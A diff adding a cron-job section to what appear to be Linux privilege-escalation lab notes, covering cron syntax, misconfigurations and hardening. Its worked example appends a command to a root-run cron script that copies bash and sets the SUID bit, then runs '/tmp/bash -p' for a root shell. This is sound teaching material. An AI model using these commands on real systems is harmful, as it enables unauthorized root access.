@@ -670,3 +670,120 @@ we will used this command but not all because the python not run in this directo
 ![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 180100.png)
 
 finally we got root :)
+# Scheduled Tasks
+
+### Scheduled Tasks in Linux: Automation and Security Implications for Privilege Escalation
+
+Scheduled tasks in Linux, primarily managed through **cron jobs**, offer a robust mechanism for automating routine tasks. While indispensable for system administration, these tasks can also present significant security risks if not properly configured, potentially serving as a vector for privilege escalation.
+
+### Understanding Cron Jobs
+
+**Cron** is a time-based job scheduler that allows users and the system to execute commands or scripts at specified intervals. Each user has their own cron configuration, and there's also a system-wide configuration that administrators can manage.
+
+### Key Concepts
+
+1. **Crontab**:
+    - The crontab (cron table) file lists the tasks scheduled by each user. You can edit your crontab using:
+        
+        ```bash
+        crontab -e
+        ```
+        
+2. **Cron Syntax**:
+    - Cron jobs are defined by a specific syntax that includes five time fields and the command to execute:
+        
+        ```jsx
+        * * * * * /path/to/command
+        ```
+        
+        - **Minute (0-59)**
+        - **Hour (0-23)**
+        - **Day of the Month (1-31)**
+        - **Month (1-12)**
+        - **Day of the Week (0-7)** (where both 0 and 7 represent Sunday)
+    - Example:
+        - `0 5 * * * /path/to/backup.sh` schedules a backup at 5 AM every day.
+3. **Special Scheduling Strings**:
+    - Instead of setting each time field, special strings simplify the scheduling:
+        - `@reboot`: Run once at startup.
+        - `@daily`: Run once a day at midnight.
+        - `@weekly`: Run once a week at midnight on Sunday.
+
+### Managing Cron Jobs
+
+- **Viewing Cron Jobs**:
+    - List your current cron jobs with:
+        
+        ```bash
+        crontab -l
+        ```
+        
+- **Removing Cron Jobs**:
+    - Delete your crontab file with:
+        
+        ```bash
+        crontab -r
+        ```
+        
+- **Cron Logs**:
+    - Output and errors from cron jobs can be logged, typically found in `/var/log/cron` or `/var/log/syslog`, ensuring you can audit job performance.
+
+### Security Implications: Cron Jobs as a Privilege Escalation Vector
+
+While cron jobs streamline tasks, they can also introduce vulnerabilities if not properly secured. Attackers can exploit these weaknesses to escalate privileges, gaining unauthorized access to higher-level functions.
+
+### Common Vulnerabilities
+
+1. **Writable Cron Scripts**:
+    - If a cron script is writable by a non-privileged user, an attacker could modify the script to execute malicious code with elevated privileges.
+    - **Example**: A backup script owned by root but writable by a standard user could be altered to run a command that grants root access.
+2. **Weak Permissions on Crontab Files**:
+    - Incorrect permissions on crontab files or directories can allow unauthorized users to edit or add tasks, leading to privilege escalation.
+    - **Example**: If `/etc/crontab` is writable by non-root users, they could insert a cron job that executes malicious scripts as root.
+3. **Path Exploitation**:
+    - Cron jobs that call commands without full paths are susceptible to path hijacking, where an attacker places a malicious script in a directory that’s searched before the legitimate command.
+    - **Example**: A cron job runs `backup.sh`, and the attacker places a malicious `backup.sh` in `/tmp`, executing their code instead.
+4. **Leveraging Special Cron Directories**:
+    - Directories like `/etc/cron.daily` or `/etc/cron.hourly` are used for system-wide cron jobs. If these directories are writable by non-privileged users, attackers can introduce malicious scripts that run with elevated privileges.
+5. **Misconfigured Sudo in Cron**:
+    - If a cron job uses `sudo` to execute commands without requiring a password, it may allow unauthorized users to run commands as root.
+    - **Example**: A cron job configured with `sudo` to run a script without a password prompt could be exploited if the script is writable by a non-privileged user.
+
+### Advanced Techniques for Securing Cron Jobs
+
+- **Enforcing Strict Permissions**:
+    - Ensure that all scripts executed by cron jobs, as well as the cron directories themselves, are secured with proper permissions to prevent unauthorized modifications.
+- **Using Full Paths**:
+    - Always specify the full path to commands and scripts in cron jobs to avoid path hijacking attacks.
+- **Regular Audits**:
+    - Regularly review cron job configurations and logs to detect any unauthorized changes or suspicious activity.
+
+### Example :-
+
+we write this command to know cron jobs in system **`cat /etc/crontab`  and see results** 
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-16 050546.png)
+
+we found this file it and don’t know place we will run this command 
+
+`find / -name overwrite.sh 2>/dev/null`
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-16 050804.png)
+
+okay we will write this command to know if we can edit or no `ls -las /usr/local/bin/` 
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-16 051134.png)
+
+okay we can write we will run this command to change data in this file and run it as root
+
+**`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`**
+
+and **`/tmp/bash -p`** 
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-16 061548.png)
+
+okay we got root :)
+
+### Conclusion
+
+Cron jobs are a critical tool for automating system tasks in Linux, but they must be managed with security in mind. Misconfigurations or weak permissions can turn cron jobs into a significant threat, potentially enabling attackers to escalate privileges and compromise the system. By understanding the risks and implementing best practices, you can leverage the power of cron jobs while keeping your system secure.
